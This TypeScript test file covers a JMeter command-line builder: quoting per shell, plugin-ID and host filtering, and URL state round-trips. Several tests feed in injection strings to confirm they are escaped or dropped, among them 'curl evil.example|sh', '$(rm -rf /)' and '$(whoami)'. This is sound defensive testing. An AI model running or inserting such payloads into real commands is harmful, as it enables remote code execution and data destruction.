import { describe, expect, it } from 'vitest';
import {
  DEFAULT_CLI_STATE,
  buildCommands,
  buildInstallCommand,
  buildRunCommand,
  jmeterCmdName,
  normalizeProperties,
  normalizeRemoteServers,
  parseCliState,
  pluginManagerCmdName,
  quoteIfNeeded,
  serializeCliState,
  type CliBuilderState,
} from '../../src/utils/cliBuilder';

const base: CliBuilderState = { ...DEFAULT_CLI_STATE };

describe('command names', () => {
  it('uses .bat binaries on Windows and .sh on unix', () => {
    expect(pluginManagerCmdName('windows')).toBe('PluginsManagerCMD.bat');
    expect(pluginManagerCmdName('unix')).toBe('PluginsManagerCMD.sh');
    expect(jmeterCmdName('windows')).toBe('jmeter.bat');
    expect(jmeterCmdName('unix')).toBe('jmeter');
  });
});

describe('quoteIfNeeded', () => {
  it('leaves safe tokens unquoted on both shells', () => {
    expect(quoteIfNeeded('results.jtl', 'unix')).toBe('results.jtl');
    expect(quoteIfNeeded('results.jtl', 'windows')).toBe('results.jtl');
  });

  it('quotes whitespace per shell convention', () => {
    expect(quoteIfNeeded('my plan.jmx', 'unix')).toBe("'my plan.jmx'");
    expect(quoteIfNeeded('my plan.jmx', 'windows')).toBe('"my plan.jmx"');
  });

  it('neutralizes shell metacharacters from crafted URLs', () => {
    expect(quoteIfNeeded('a;curl evil|sh', 'unix')).toBe("'a;curl evil|sh'");
    expect(quoteIfNeeded("it's.jmx", 'unix')).toBe("'it'\\''s.jmx'");
    expect(quoteIfNeeded('a&b.jmx', 'windows')).toBe('"a&b.jmx"');
    expect(quoteIfNeeded('say "hi".jmx', 'windows')).toBe('"say ""hi"".jmx"');
  });
});

describe('normalizeProperties', () => {
  it('trims and drops blanks and malformed entries', () => {
    expect(normalizeProperties([' threads=100 ', '', 'noequals', 'a=', '=b'])).toEqual([
      'threads=100',
      'a=',
    ]);
  });

  it('keeps values containing equals signs but rejects invalid keys', () => {
    expect(normalizeProperties(['url=https://a.b/?x=1', 'bad key=v'])).toEqual([
      'url=https://a.b/?x=1',
    ]);
  });
});

describe('normalizeRemoteServers', () => {
  it('splits comma-separated hosts', () => {
    expect(normalizeRemoteServers(' 10.0.0.1, ,10.0.0.2 ')).toEqual(['10.0.0.1', '10.0.0.2']);
    expect(normalizeRemoteServers('')).toEqual([]);
  });

  it('drops tokens that are not hosts (URL-injected shell syntax)', () => {
    expect(normalizeRemoteServers('10.0.0.1, $(rm -rf /), ::1')).toEqual(['10.0.0.1', '::1']);
  });
});

describe('buildInstallCommand', () => {
  it('returns null with no plugins', () => {
    expect(buildInstallCommand(base)).toBeNull();
  });

  it('builds a comma-joined install command', () => {
    expect(buildInstallCommand({ ...base, plugins: ['jpgc-tst', ' jpgc-dummy '] })).toBe(
      'PluginsManagerCMD.sh install jpgc-tst,jpgc-dummy',
    );
  });

  it('drops plugin IDs that are not registry-style slugs', () => {
    expect(buildInstallCommand({ ...base, plugins: ['jpgc-tst;id', 'jpgc-tst'] })).toBe(
      'PluginsManagerCMD.sh install jpgc-tst',
    );
    expect(buildInstallCommand({ ...base, plugins: ['$(whoami)'] })).toBeNull();
  });
});

describe('buildRunCommand', () => {
  it('returns null without a test plan', () => {
    expect(buildRunCommand({ ...base, testPlan: ' ' })).toBeNull();
  });

  it('builds a minimal headless run command', () => {
    expect(
      buildRunCommand({
        ...base,
        generateReport: false,
        forceDeleteResults: false,
        logFile: '',
        remoteServers: '',
        properties: [],
      }),
    ).toBe('jmeter -n -t test-plan.jmx -l results.jtl');
  });

  it('includes force, log, remotes, properties, and report flags', () => {
    expect(
      buildRunCommand({
        ...base,
        os: 'windows',
        testPlan: 'my plan.jmx',
        remoteServers: '10.0.0.1, 10.0.0.2',
        properties: ['threads=100', 'ramp=60'],
      }),
    ).toBe(
      'jmeter.bat -n -t "my plan.jmx" -f -l results.jtl -R 10.0.0.1,10.0.0.2 ' +
        '-Jthreads=100 -Jramp=60 -e -o dashboard-report',
    );
  });
});

describe('buildCommands', () => {
  it('respects the selected mode', () => {
    const state = { ...base, plugins: ['jpgc-tst'] };
    expect(buildCommands({ ...state, mode: 'install' })).toEqual([
      'PluginsManagerCMD.sh install jpgc-tst',
    ]);
    expect(buildCommands({ ...state, mode: 'run' })).toHaveLength(1);
    expect(buildCommands({ ...state, mode: 'full' })).toHaveLength(2);
    expect(buildCommands({ ...base, mode: 'install' })).toEqual([]);
  });
});

describe('serialize/parse round-trip', () => {
  it('serializes only non-default values', () => {
    expect(serializeCliState(DEFAULT_CLI_STATE).toString()).toBe('');
  });

  it('always persists mode when plugins are present', () => {
    const params = serializeCliState({ ...base, plugins: ['jpgc-tst'] });
    expect(params.get('mode')).toBe('run');
    expect(params.get('plugins')).toBe('jpgc-tst');
  });

  it('quotes property values with spaces in the run command', () => {
    expect(
      buildRunCommand({ ...base, generateReport: false, properties: ['greeting=hello world'] }),
    ).toContain("-Jgreeting='hello world'");
  });

  it('escapes a test plan containing shell syntax', () => {
    expect(
      buildRunCommand({
        ...base,
        testPlan: 'test.jmx;curl evil.example|sh',
        generateReport: false,
      }),
    ).toContain("-t 'test.jmx;curl evil.example|sh'");
  });

  it('round-trips a fully customized state', () => {
    const state: CliBuilderState = {
      os: 'windows',
      mode: 'full',
      testPlan: 'soak test.jmx',
      resultsFile: 'out/results.jtl',
      logFile: 'jmeter.log',
      generateReport: false,
      reportDir: 'report out',
      forceDeleteResults: false,
      remoteServers: '10.0.0.1,10.0.0.2',
      properties: ['threads=200', 'bad-line'],
      plugins: ['jpgc-tst', 'jpgc-casutg'],
    };
    const parsed = parseCliState(serializeCliState(state));
    expect(parsed).toEqual({ ...state, properties: ['threads=200'] });
  });

  it('ignores invalid enum values', () => {
    const params = new URLSearchParams('os=plan9&mode=hack');
    expect(parseCliState(params)).toEqual(DEFAULT_CLI_STATE);
  });
});
